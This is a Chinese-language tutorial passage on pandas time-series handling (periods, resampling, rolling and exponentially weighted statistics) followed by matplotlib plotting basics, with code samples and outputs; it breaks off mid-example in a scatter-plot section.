Period(&apos;2012-01-30 16:00&apos;, &apos;T&apos;) 1p4pm.to_timestamp() Timestamp(&apos;2012-01-30 16:00:00&apos;) period_range可用于生成季度型范围。季度型范围的算术运算也跟上面是一样的： 123rng = pd.period_range('2011Q3', '2012Q4', freq='Q-JAN')ts = pd.Series(np.arange(len(rng)), index=rng)ts 2011Q3 0 2011Q4 1 2012Q1 2 2012Q2 3 2012Q3 4 2012Q4 5 Freq: Q-JAN, dtype: int32 123new_rng = (rng.asfreq('B', 'e') - 1).asfreq('T', 's') + 16 * 60ts.index = new_rng.to_timestamp()ts 2010-10-28 16:00:00 0 2011-01-28 16:00:00 1 2011-04-28 16:00:00 2 2011-07-28 16:00:00 3 2011-10-28 16:00:00 4 2012-01-30 16:00:00 5 dtype: int32 将Timestamp转换为Period（及其反向过程）通过使用 to_period 方法，可以将由时间戳索引的 Series 和 DataFrame 对象转换为以时期索引： 123rng = pd.date_range('2000-01-01', periods=3, freq='M')ts = pd.Series(np.random.randn(3), index=rng)ts 2000-01-31 0.269545 2000-02-29 -0.056993 2000-03-31 0.967725 Freq: M, dtype: float64 12pts = ts.to_period()pts 2000-01 0.269545 2000-02 -0.056993 2000-03 0.967725 Freq: M, dtype: float64 由于时期指的是非重叠时间区间，因此对于给定的频率，一个时间戳只能属于一个时期。新PeriodIndex的频率默认是从时间戳推断而来的，你也可以指定任何别的频率。结果中允许存在重复时期： 123rng = pd.date_range('1/29/2000', periods=6, freq='D')ts2 = pd.Series(np.random.randn(6), index=rng)ts2 2000-01-29 0.193937 2000-01-30 -1.982108 2000-01-31 1.623989 2000-02-01 -0.980946 2000-02-02 1.431045 2000-02-03 0.765108 Freq: D, dtype: float64 1ts2.to_period('M') 2000-01 0.193937 2000-01 -1.982108 2000-01 1.623989 2000-02 -0.980946 2000-02 1.431045 2000-02 0.765108 Freq: M, dtype: float64 要转换回时间戳，使用to_timestamp即可： 12pts = ts2.to_period()pts 2000-01-29 0.193937 2000-01-30 -1.982108 2000-01-31 1.623989 2000-02-01 -0.980946 2000-02-02 1.431045 2000-02-03 0.765108 Freq: D, dtype: float64 1pts.to_timestamp(how='end') 2000-01-29 0.193937 2000-01-30 -1.982108 2000-01-31 1.623989 2000-02-01 -0.980946 2000-02-02 1.431045 2000-02-03 0.765108 Freq: D, dtype: float64 通过数组创建 PeriodIndex (通过多列创建时间索引)固定频率的数据集通常会将时间信息分开存放在多个列中。例如，在下面这个宏观经济数据集中，年度和季度就分别存放在不同的列中： 12data = pd.read_csv('data/examples/macrodata.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year quarter realgdp realcons realinv realgovt realdpi cpi m1 tbilrate unemp pop infl realint 0 1959.0 1.0 2710.349 1707.4 286.898 470.045 1886.9 28.98 139.7 2.82 5.8 177.146 0.00 0.00 1 1959.0 2.0 2778.801 1733.7 310.859 481.301 1919.7 29.15 141.7 3.08 5.1 177.830 2.34 0.74 2 1959.0 3.0 2775.488 1751.8 289.226 491.260 1916.4 29.35 140.5 3.82 5.3 178.657 2.74 1.09 3 1959.0 4.0 2785.204 1753.7 299.356 484.052 1931.3 29.37 140.0 4.33 5.6 179.386 0.27 4.06 4 1960.0 1.0 2847.699 1770.5 331.722 462.199 1955.5 29.54 139.6 3.50 5.2 180.007 2.31 1.19 通过将这些时间列数组以及一个频率传入PeriodIndex，就可以将它们合并成DataFrame的一个索引： 12index = pd.PeriodIndex(year=data.year, quarter=data.quarter, freq='Q-DEC')index PeriodIndex([&apos;1959Q1&apos;, &apos;1959Q2&apos;, &apos;1959Q3&apos;, &apos;1959Q4&apos;, &apos;1960Q1&apos;, &apos;1960Q2&apos;, &apos;1960Q3&apos;, &apos;1960Q4&apos;, &apos;1961Q1&apos;, &apos;1961Q2&apos;, ... &apos;2007Q2&apos;, &apos;2007Q3&apos;, &apos;2007Q4&apos;, &apos;2008Q1&apos;, &apos;2008Q2&apos;, &apos;2008Q3&apos;, &apos;2008Q4&apos;, &apos;2009Q1&apos;, &apos;2009Q2&apos;, &apos;2009Q3&apos;], dtype=&apos;period[Q-DEC]&apos;, length=203, freq=&apos;Q-DEC&apos;) 12data.index = indexdata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } year quarter realgdp realcons realinv realgovt realdpi cpi m1 tbilrate unemp pop infl realint 1959Q1 1959.0 1.0 2710.349 1707.4 286.898 470.045 1886.9 28.98 139.7 2.82 5.8 177.146 0.00 0.00 1959Q2 1959.0 2.0 2778.801 1733.7 310.859 481.301 1919.7 29.15 141.7 3.08 5.1 177.830 2.34 0.74 1959Q3 1959.0 3.0 2775.488 1751.8 289.226 491.260 1916.4 29.35 140.5 3.82 5.3 178.657 2.74 1.09 1959Q4 1959.0 4.0 2785.204 1753.7 299.356 484.052 1931.3 29.37 140.0 4.33 5.6 179.386 0.27 4.06 1960Q1 1960.0 1.0 2847.699 1770.5 331.722 462.199 1955.5 29.54 139.6 3.50 5.2 180.007 2.31 1.19 1data.infl.head() 1959Q1 0.00 1959Q2 2.34 1959Q3 2.74 1959Q4 0.27 1960Q1 2.31 Freq: Q-DEC, Name: infl, dtype: float64 重采样及频率转换重采样（resampling）指的是将时间序列从一个频率转换到另一个频率的处理过程。将高频率数据聚合到低频率称为降采样（downsampling），而将低频率数据转换到高频率则称为升采样（upsampling）。 pandas对象都带有一个resample方法，它是各种频率转换工作的主力函数。resample有一个类似于groupby的API，调用resample可以分组数据，然后会调用一个聚合函数： 123rng = pd.date_range('2000-01-01', periods=100, freq='D')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts.head() 2000-01-01 -1.798126 2000-01-02 0.937883 2000-01-03 -1.010101 2000-01-04 -0.553884 2000-01-05 -1.131896 Freq: D, dtype: float64 1ts.resample('M').mean() 2000-01-31 -0.163057 2000-02-29 -0.128462 2000-03-31 -0.136395 2000-04-30 0.362875 Freq: M, dtype: float64 1ts.resample('M', kind='period').mean() 2000-01 -0.163057 2000-02 -0.128462 2000-03 -0.136395 2000-04 0.362875 Freq: M, dtype: float64 降采样将数据聚合到规律的低频率是一件非常普通的时间序列处理任务。待聚合的数据不必拥有固定的频率，期望的频率会自动定义聚合的面元边界，这些面元用于将时间序列拆分为多个片段。例如，要转换到月度频率（’M’或’BM’），数据需要被划分到多个单月时间段中。各时间段都是半开放的。一个数据点只能属于一个时间段，所有时间段的并集必须能组成整个时间帧。在用resample对数据进行降采样时，需要考虑两样东西： 各区间哪边是闭合的。 如何标记各个聚合面元，用区间的开头还是末尾。 为了说明，我们来看一些“1分钟”数据： 123rng = pd.date_range('2000-01-01', periods=12, freq='T')ts = pd.Series(np.arange(12), index=rng)ts 2000-01-01 00:00:00 0 2000-01-01 00:01:00 1 2000-01-01 00:02:00 2 2000-01-01 00:03:00 3 2000-01-01 00:04:00 4 2000-01-01 00:05:00 5 2000-01-01 00:06:00 6 2000-01-01 00:07:00 7 2000-01-01 00:08:00 8 2000-01-01 00:09:00 9 2000-01-01 00:10:00 10 2000-01-01 00:11:00 11 Freq: T, dtype: int32 假设你想要通过求和的方式将这些数据聚合到“5分钟”块中： 1ts.resample('5min', closed='right').sum() 1999-12-31 23:55:00 0 2000-01-01 00:00:00 15 2000-01-01 00:05:00 40 2000-01-01 00:10:00 11 Freq: 5T, dtype: int32 传入的频率将会以“5分钟”的增量定义面元边界。默认情况下，面元的右边界是包含的，因此00:00到00:05的区间中是包含00:05的。传入closed=’left’会让区间以左边界闭合： 1ts.resample('5min', closed='left').sum() 2000-01-01 00:00:00 10 2000-01-01 00:05:00 35 2000-01-01 00:10:00 21 Freq: 5T, dtype: int32 最终的时间序列是以各面元右边界的时间戳进行标记的。传入label=’right’即可用面元的邮编界对其进行标记： 1ts.resample('5min', closed='right', label='right').sum() 2000-01-01 00:00:00 0 2000-01-01 00:05:00 15 2000-01-01 00:10:00 40 2000-01-01 00:15:00 11 Freq: 5T, dtype: int32 下图说明了“1分钟”数据被转换为“5分钟”数据的处理过程。 最后，你可能希望对结果索引做一些位移，比如从右边界减去一秒以便更容易明白该时间戳到底表示的是哪个区间。只需通过loffset设置一个字符串或日期偏移量即可实现这个目的： 1ts.resample('5min', closed='right', label='right', loffset='-1s').sum() 1999-12-31 23:59:59 0 2000-01-01 00:04:59 15 2000-01-01 00:09:59 40 2000-01-01 00:14:59 11 Freq: 5T, dtype: int32 1ts.resample('5min', closed='left', label='right', loffset='-1s').sum() 2000-01-01 00:04:59 10 2000-01-01 00:09:59 35 2000-01-01 00:14:59 21 Freq: 5T, dtype: int32 此外，也可以通过调用结果对象的 shift 方法来实现该目的 12temp = ts.resample('5min', closed='left', label='right').sum()temp 2000-01-01 00:05:00 10 2000-01-01 00:10:00 35 2000-01-01 00:15:00 21 Freq: 5T, dtype: int32 1temp.shift(-1, freq='s') 2000-01-01 00:04:59 10 2000-01-01 00:09:59 35 2000-01-01 00:14:59 21 Freq: 5T, dtype: int32 OHLC重采样金融领域中有一种无所不在的时间序列聚合方式，即计算各面元的四个值：第一个值（open，开盘）、最后一个值（close，收盘）、最大值（high，最高）以及最小值（low，最低）。传入how=’ohlc’即可得到一个含有这四种聚合值的DataFrame。整个过程很高效，只需一次扫描即可计算出结果： 1ts 2000-01-01 00:00:00 0 2000-01-01 00:01:00 1 2000-01-01 00:02:00 2 2000-01-01 00:03:00 3 2000-01-01 00:04:00 4 2000-01-01 00:05:00 5 2000-01-01 00:06:00 6 2000-01-01 00:07:00 7 2000-01-01 00:08:00 8 2000-01-01 00:09:00 9 2000-01-01 00:10:00 10 2000-01-01 00:11:00 11 Freq: T, dtype: int32 1ts.resample('5min').ohlc() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } open high low close 2000-01-01 00:00:00 0 4 0 4 2000-01-01 00:05:00 5 9 5 9 2000-01-01 00:10:00 10 11 10 11 升采样和插值在将数据从低频率转换到高频率时，就不需要聚合了。我们来看一个带有一些周型数据的DataFrame： 1234frame = pd.DataFrame(np.random.randn(2, 4), index=pd.date_range('1/1/2000', periods=2, freq='W-WED'), columns=['Colorado', 'Texas', 'New York', 'Ohio'])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01-05 0.512990 1.145801 0.765452 -1.319816 2000-01-12 0.702946 -0.824366 1.054700 1.809035 当你对这个数据进行聚合，每组只有一个值，这样就会引入缺失值。我们使用asfreq方法转换成高频，不经过聚合： 12df_daily = frame.resample('D').asfreq()df_daily .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01-05 0.512990 1.145801 0.765452 -1.319816 2000-01-06 NaN NaN NaN NaN 2000-01-07 NaN NaN NaN NaN 2000-01-08 NaN NaN NaN NaN 2000-01-09 NaN NaN NaN NaN 2000-01-10 NaN NaN NaN NaN 2000-01-11 NaN NaN NaN NaN 2000-01-12 0.702946 -0.824366 1.054700 1.809035 假设你想要用前面的周型值填充“非星期三”。resample 的填充和插值方式跟fillna和reindex的一样： 1frame.resample('D').ffill() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01-05 0.512990 1.145801 0.765452 -1.319816 2000-01-06 0.512990 1.145801 0.765452 -1.319816 2000-01-07 0.512990 1.145801 0.765452 -1.319816 2000-01-08 0.512990 1.145801 0.765452 -1.319816 2000-01-09 0.512990 1.145801 0.765452 -1.319816 2000-01-10 0.512990 1.145801 0.765452 -1.319816 2000-01-11 0.512990 1.145801 0.765452 -1.319816 2000-01-12 0.702946 -0.824366 1.054700 1.809035 同样，这里也可以只填充指定的时期数（目的是限制前面的观测值的持续使用距离）： 1frame.resample('D').ffill(limit=2) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01-05 0.512990 1.145801 0.765452 -1.319816 2000-01-06 0.512990 1.145801 0.765452 -1.319816 2000-01-07 0.512990 1.145801 0.765452 -1.319816 2000-01-08 NaN NaN NaN NaN 2000-01-09 NaN NaN NaN NaN 2000-01-10 NaN NaN NaN NaN 2000-01-11 NaN NaN NaN NaN 2000-01-12 0.702946 -0.824366 1.054700 1.809035 通过时期(period)进行重采样对那些使用时期索引的数据进行重采样与时间戳很像： 1234frame = pd.DataFrame(np.random.randn(24, 4), index=pd.period_range('1-2000', '12-2001', freq='M'), columns=['Colorado', 'Texas', 'New York', 'Ohio'])frame.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01 1.031093 0.497053 0.741678 -0.765792 2000-02 0.882783 1.501811 0.966431 0.258871 2000-03 0.793097 2.349771 1.678723 -0.131274 2000-04 0.501516 -1.210646 -1.090834 -1.627167 2000-05 -0.941150 -1.149196 -1.078340 -1.399332 1frame.index PeriodIndex([&apos;2000-01&apos;, &apos;2000-02&apos;, &apos;2000-03&apos;, &apos;2000-04&apos;, &apos;2000-05&apos;, &apos;2000-06&apos;, &apos;2000-07&apos;, &apos;2000-08&apos;, &apos;2000-09&apos;, &apos;2000-10&apos;, &apos;2000-11&apos;, &apos;2000-12&apos;, &apos;2001-01&apos;, &apos;2001-02&apos;, &apos;2001-03&apos;, &apos;2001-04&apos;, &apos;2001-05&apos;, &apos;2001-06&apos;, &apos;2001-07&apos;, &apos;2001-08&apos;, &apos;2001-09&apos;, &apos;2001-10&apos;, &apos;2001-11&apos;, &apos;2001-12&apos;], dtype=&apos;period[M]&apos;, freq=&apos;M&apos;) 降采样 12annual_frame = frame.resample('Y').mean()annual_frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000 0.134307 -0.098188 -0.306211 -0.268521 2001 -0.750393 -0.031389 0.054950 0.275272 ??? 这个升采样没理解 升采样要稍微麻烦一些，因为你必须决定在新频率中各区间的哪端用于放置原来的值，就像asfreq方法那样。convention参数默认为’start’，也可设置为’end’： 1annual_frame.resample('Q-DEC').ffill() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000Q1 0.134307 -0.098188 -0.306211 -0.268521 2000Q2 0.134307 -0.098188 -0.306211 -0.268521 2000Q3 0.134307 -0.098188 -0.306211 -0.268521 2000Q4 0.134307 -0.098188 -0.306211 -0.268521 2001Q1 -0.750393 -0.031389 0.054950 0.275272 2001Q2 -0.750393 -0.031389 0.054950 0.275272 2001Q3 -0.750393 -0.031389 0.054950 0.275272 2001Q4 -0.750393 -0.031389 0.054950 0.275272 1annual_frame.resample('Q-DEC', convention='end').ffill() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000Q4 0.134307 -0.098188 -0.306211 -0.268521 2001Q1 0.134307 -0.098188 -0.306211 -0.268521 2001Q2 0.134307 -0.098188 -0.306211 -0.268521 2001Q3 0.134307 -0.098188 -0.306211 -0.268521 2001Q4 -0.750393 -0.031389 0.054950 0.275272 由于时期指的是时间区间，所以升采样和降采样的规则就比较严格： 在降采样中，目标频率必须是源频率的子时期（subperiod）。 在升采样中，目标频率必须是源频率的超时期（superperiod）。 如果不满足这些条件，就会引发异常。这主要影响的是按季、年、周计算的频率。例如，由Q-MAR定义的时间区间只能升采样为A-MAR、A-JUN、A-SEP、A-DEC等： 1annual_frame.resample('Q-MAR').ffill() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000Q4 0.134307 -0.098188 -0.306211 -0.268521 2001Q1 0.134307 -0.098188 -0.306211 -0.268521 2001Q2 0.134307 -0.098188 -0.306211 -0.268521 2001Q3 0.134307 -0.098188 -0.306211 -0.268521 2001Q4 -0.750393 -0.031389 0.054950 0.275272 2002Q1 -0.750393 -0.031389 0.054950 0.275272 2002Q2 -0.750393 -0.031389 0.054950 0.275272 2002Q3 -0.750393 -0.031389 0.054950 0.275272 移动窗口函数在移动窗口（可以带有指数衰减权数）上计算的各种统计函数也是一类常见于时间序列的数组变换。这样可以圆滑噪音数据或断裂数据。我将它们称为移动窗口函数（moving window function），其中还包括那些窗口不定长的函数（如指数加权移动平均）。跟其他统计函数一样，移动窗口函数也会自动排除缺失值。 开始之前，我们加载一些时间序列数据，将其重采样为工作日频率： 123close_px_all = pd.read_csv('data/examples/stock_px_2.csv', parse_dates=True, index_col=0)close_px = close_px_all[['AAPL', 'MSFT', 'XOM']]close_px.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM 2003-01-02 7.40 21.11 29.22 2003-01-03 7.45 21.14 29.24 2003-01-06 7.45 21.52 29.96 2003-01-07 7.43 21.93 28.95 2003-01-08 7.28 21.31 28.83 12close_px = close_px.resample('B').ffill()close_px.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM 2003-01-02 7.40 21.11 29.22 2003-01-03 7.45 21.14 29.24 2003-01-06 7.45 21.52 29.96 2003-01-07 7.43 21.93 28.95 2003-01-08 7.28 21.31 28.83 现在引入rolling运算符，它与resample和groupby很像。可以在TimeSeries或DataFrame以及一个window（表示期数，见图11-4）上调用它： 12close_px.AAPL.plot()close_px.AAPL.rolling(250).mean().plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xc51a898&gt; 12 &lt;matplotlib.axes._subplots.AxesSubplot at 0xc41fcc0&gt; 表达式rolling(250)与groupby很像，但不是对其进行分组，而是创建一个按照250天分组的滑动窗口对象。然后，我们就得到了苹果公司股价的250天的移动窗口。 默认情况下，rolling函数需要窗口中所有的值为非NA值。可以修改该行为以解决缺失数据的问题。其实，在时间序列开始处尚不足窗口期的那些数据就是个特例 12appl_std250 = close_px.AAPL.rolling(250, min_periods=10).std()appl_std250[5:12] 2003-01-09 NaN 2003-01-10 NaN 2003-01-13 NaN 2003-01-14 NaN 2003-01-15 0.077496 2003-01-16 0.074760 2003-01-17 0.112368 Freq: B, Name: AAPL, dtype: float64 1appl_std250.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xc60f0b8&gt; 要计算扩展窗口平均（expanding window mean），可以使用expanding而不是rolling。“扩展”意味着，从时间序列的起始处开始窗口，增加窗口直到它超过所有的序列。apple_std250时间序列的扩展窗口平均如下所示： 12expanding_mean = appl_std250.expanding().mean()expanding_mean.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xc6bb940&gt; 对DataFrame调用rolling_mean（以及与之类似的函数）会将转换应用到所有的列上 1close_px.rolling(60).mean().plot(logy=True) &lt;matplotlib.axes._subplots.AxesSubplot at 0xc6bba90&gt; rolling函数也可以接受一个指定固定大小时间补偿字符串，而不是一组时期。这样可以方便处理不规律的时间序列。这些字符串也可以传递给resample。例如，我们可以计算20天的滚动均值，如下所示： 1close_px.rolling('20D').mean().head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM 2003-01-02 7.400000 21.110000 29.220000 2003-01-03 7.425000 21.125000 29.230000 2003-01-06 7.433333 21.256667 29.473333 2003-01-07 7.432500 21.425000 29.342500 2003-01-08 7.402000 21.402000 29.240000 指数加权函数另一种使用固定大小窗口及相等权数观测值的办法是，定义一个衰减因子（decay factor）常量，以便使近期的观测值拥有更大的权数。衰减因子的定义方式有很多，比较流行的是使用时间间隔（span），它可以使结果兼容于窗口大小等于时间间隔的简单移动窗口（simple moving window）函数。 由于指数加权统计会赋予近期的观测值更大的权数，因此相对于等权统计，它能“适应”更快的变化。 除了rolling和expanding，pandas还有ewm运算符。下面这个例子对比了苹果公司股价的30日移动平均和span=30的指数加权移动平均 12345aapl_px = close_px.AAPL['2006':'2007']ma60 = aapl_px.rolling(30, min_periods=20).mean()ewma60 = aapl_px.ewm(span=30).mean()ma60.plot(style='k--', label='Simple MA')ewma60.plot(style='k-', label='EW MA') &lt;matplotlib.axes._subplots.AxesSubplot at 0xcadb5c0&gt; 二元移动窗口函数有些统计运算（如相关系数和协方差）需要在两个时间序列上执行。例如，金融分析师常常对某只股票对某个参考指数（如标准普尔500指数）的相关系数感兴趣。要进行说明，我们先计算我们感兴趣的时间序列的百分数变化： 123spx_px = close_px_all['SPX']spx_rets = spx_px.pct_change()returns = close_px.pct_change() 调用rolling之后，corr聚合函数开始计算与spx_rets滚动相关系数 12corr = returns.AAPL.rolling(125, min_periods=100).corr(spx_rets)corr.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xdb4b5f8&gt; 假设你想要一次性计算多只股票与标准普尔500指数的相关系数。虽然编写一个循环并新建一个DataFrame不是什么难事，但比较啰嗦。其实，只需传入一个TimeSeries和一个DataFrame，rolling_corr就会自动计算TimeSeries（本例中就是spx_rets）与DataFrame各列的相关系数。 12corr = returns.rolling(125, min_periods=100).corr(spx_rets)corr.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xdc05dd8&gt; 用户定义的移动窗口函数rolling_apply函数使你能够在移动窗口上应用自己设计的数组函数。唯一要求的就是：该函数要能从数组的各个片段中产生单个值（即约简）。比如说，当我们用rolling(…).quantile(q)计算样本分位数时，可能对样本中特定值的百分等级感兴趣。scipy.stats.percentileofscore函数就能达到这个目的 1234from scipy.stats import percentileofscorescore_at_2percent = lambda x: percentileofscore(x, 0.02)result = returns.AAPL.rolling(250).apply(score_at_2percent, raw=False)result.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0xdd44630&gt; 12]]></content>
      <categories>
        <category>数据分析</category>
        <category>pandas</category>
      </categories>
      <tags>
        <tag>pandas 时间序列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[matplotlib 基础]]></title>
    <url>%2F2019%2F04%2F15%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%2Fmatplotlib%20%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[基础设置12# 引入from matplotlib import pyplot as plt 示例 12345678# 获取x轴的点，需要是可迭代对象x = range(2, 26, 2)# 获取y轴的点，需要是可迭代对象y = [15, 13, 14.5, 17, 20, 25, 26, 26, 24, 22, 18, 15]# 通过plot绘制折线图， x 和 y 是对应的关系，也就是长度要一样 plt.plot(x, y)# 展示图形plt.show() 设置图片大小、质量123456# 画图之前设置图片信息 figsize 设置图片的大小； dpi 设置图片的质量，让图片更清晰fig = plt.figure(figsize=(6, 4), dpi= 80)x = range(2, 26, 2)y = [15, 13, 14.5, 17, 20, 25, 26, 26, 24, 22, 18, 15]plt.plot(x, y)plt.show() 下载图片1234567# 画图之前设置图片信息 figsize 设置图片的大小； dpi 设置图片的质量，让图片更清晰fig = plt.figure(figsize=(6, 4), dpi= 80)x = range(2, 26, 2)y = [15, 13, 14.5, 17, 20, 25, 26, 26, 24, 22, 18, 15]plt.plot(x, y)# 保存图片，可以根据后缀名来指定保存的格式plt.savefig('savefig.png') 调整 X 或者 Y 轴上的刻度和显示内容虽然指定了 x 轴和 y 轴对应点的关系，但是 x 轴和 y 轴的刻度并没有指定，如果默认的刻度不满足需求，我们可以进行更改 1234567891011# 画图之前设置图片信息 figsize 设置图片的大小； dpi 设置图片的质量，让图片更清晰fig = plt.figure(figsize=(6, 4), dpi= 80)x = range(2, 26, 2)y = [15, 13, 14.5, 17, 20, 25, 26, 26, 24, 22, 18, 15]plt.plot(x, y)# 指定x轴的刻度值# plt.xticks(x)# 可以调整刻度的稀疏plt.xticks(x[::2])# 保存图片，可以根据后缀名来指定保存的格式plt.show() 设置 x、y 轴刻度的别名、刻度方向那么问题来了: 如果列表a表示10点到12点的每一分钟的气温,如何绘制折线图观察每分钟气温的变化情况? a= [random.randint(20,35) for i in range(120)] 12345678910111213import randomfig = plt.figure(figsize = (28, 8))y = [random.randint(20,35) for i in range(120)]x = range(120)plt.plot(x, y)# 生成x坐标对应的别名_x_ticks = ['10点&#123;&#125;分'.format(i) for i in x if i &lt; 60]_x_ticks += ['11点&#123;&#125;分'.format(i) for i in x if i &gt; 60]# 前两个参数要一一对应，表示刻度和别名的对应关系# rotation参数表示刻度显示旋转的方向# plt.xticks(x, _x_ticks, rotation = 45)plt.xticks(x[::5], _x_ticks[::5], rotation = 45)plt.show() 设置显示中文matplotlib 默认不支持中文字符，因为默认的英文字体无法显示汉字查看 linux/mac 下面支持的字体:fc-list 查看支持的字体fc-list :lang=zh 查看支持的中文(冒号前面有空格) mac 下如果不支持该命令，需要安装 brew install fontconfig 那么问题来了:如何修改 matplotlib 的默认字体? 通过 matplotlib.rc 可以修改,具体方法参见源码( windows/linux 平台下可行) 通过 matplotlib 下的 font_manager 可以解决( windows/linux/mac 平台下可行) 1234567891011121314151617181920212223import random import matplotlibfrom matplotlib import font_manager # 全局的字体设置(没实验成功，没找到字体名)# font = &#123;# 'family': "Microsoft Yahei",# 'size': "10"# &#125;# matplotlib.rc('font', **font)fig = plt.figure(figsize = (28, 8))y = [random.randint(20,35) for i in range(120)]x = range(120)plt.plot(x, y)_x_ticks = ['10点&#123;&#125;分'.format(i) for i in x if i &lt; 60]_x_ticks += ['11点&#123;&#125;分'.format(i) for i in x if i &gt; 60]# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')plt.xticks(x[::5], _x_ticks[::5], rotation = 45, fontproperties = my_font)plt.show() 给图像添加描述信息设置图的 title 和轴的 label，显示网格12345678910111213141516171819fig = plt.figure(figsize = (28, 8))y = [random.randint(20,35) for i in range(120)]x = range(120)plt.plot(x, y)_x_ticks = ['10点&#123;&#125;分'.format(i) for i in x if i &lt; 60]_x_ticks += ['11点&#123;&#125;分'.format(i) for i in x if i &gt; 60]# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')plt.xticks(x[::5], _x_ticks[::5], rotation = 45, fontproperties = my_font)# 设置x、y轴的labelplt.xlabel('时间', fontproperties = my_font)plt.ylabel('温度', fontproperties = my_font)# 设置图的标题plt.title('10-11点的温度记录', fontproperties = my_font)# 显示网格plt.grid(alpha = 0.4)plt.show() 设置线条样式和图例位置线条样式参数值 颜色字符(color) 风格字符(linestyle) 点样式(marker) r红色 - or solid 实线 . point g绿色 -- or dashed 虚线 , pixel g蓝色 -. or dashdot 点划线 o circle w白色 : or dotted 点虚线 v triangle_down c青色 空或者空格，无线条 ^ triangle_up m洋红 &lt; triangle_left y黄色 k黑色 #00ff0016进制 123456789101112a = [1,0,1,1,2,4,3,2,3,4,4,5,6,5,4,3,3,1,1,1]b = [1,0,3,1,2,2,3,3,2,1 ,2,1,1,1,1,1,1,1,1,1]x = range(20)# 绘制两条线 # label 线条数名; color 设置字体颜色； linestyle 设置线条样式； linewidth 设置线条宽度； alpha 设置线条透明度plt.plot(x, a, label='线1', color='r', linestyle='--', linewidth=5, alpha=0.5)plt.plot(x, b, label='线2')my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')# 显示图例 prop 指定文字类型， loc 指定显示位置plt.legend(prop = my_font, loc = 'best')plt.show() 添加注解123456# text添加文字注解from numpy import randomrandom.seed(10)plt.plot(random.randn(30).cumsum(), 'ko--')# 添加注解plt.text(5, 2, 'hello', family='monospace', fontsize = 10) Text(5, 2, &apos;hello&apos;) 123456789101112# annotate 添加注解from numpy import randomrandom.seed(10)plt.plot(random.randn(30).cumsum(), 'ko--')# 添加注解plt.annotate('jinrong', xy=(6, 2), # 指向的点 xytext=(6, 6), # 文字位置 arrowprops=dict(facecolor='green', headwidth=6, headlength=6, width=2),# 设置箭头 颜色 头的宽度 头的高度 线宽 horizontalalignment='right', # 文字在箭头的左侧还是右侧 verticalalignment='top' # 文字在箭头的顶部还是底部 ) Text(6, 6, &apos;jinrong&apos;) 折线图plot上面的都是以折线图为例子的，看下就OK 1234567891011from numpy.random import randndata = randn(30).cumsum()# plt.plot(randn(30).cumsum(), 'ko--')# 扩展开就是下面这种形式 marker 绘制点plt.plot(data, color='k', linestyle='dashed', marker='o')# 在线型图中，非实际数据点默认是按线性方式插值的。可以通过drawstyle选项修改plt.plot(data, 'k-', drawstyle='steps-post')# 返回当前的X轴绘图范围print(plt.xlim())# 设置x轴绘制范围plt.xlim([0, 50]) (-1.4500000000000002, 30.45) (0, 50) 散点图scatter散点图和折线图的用法相似，基本把plot改成scatter方法 123456789101112131415161718192021222324252627# 假设下面是3,10月份每天白天的最高气温y_a = [11,17,16,11,12,11,12,6,6,7,8,9,12,15,14,17,18,21,16,17,20,14,15,15,15,19,21,22,22,22,23]y_b = [26,26,28,19,21,17,16,19,18,20,20,19,22,23,17,20,21,20,22,15,11,15,5,13,17,10,11,13,12,13,6]fig = plt.figure(figsize = (28, 8))# 分别获取a、b对应的x的坐标x_a = range(1, 32)x_b = range(51, 82)# 绘制散点图plt.scatter(x_a, y_a)plt.scatter(x_b, y_b)_x_ticks = ['3月&#123;&#125;日'.format(i) for i in x_a]_x_ticks += 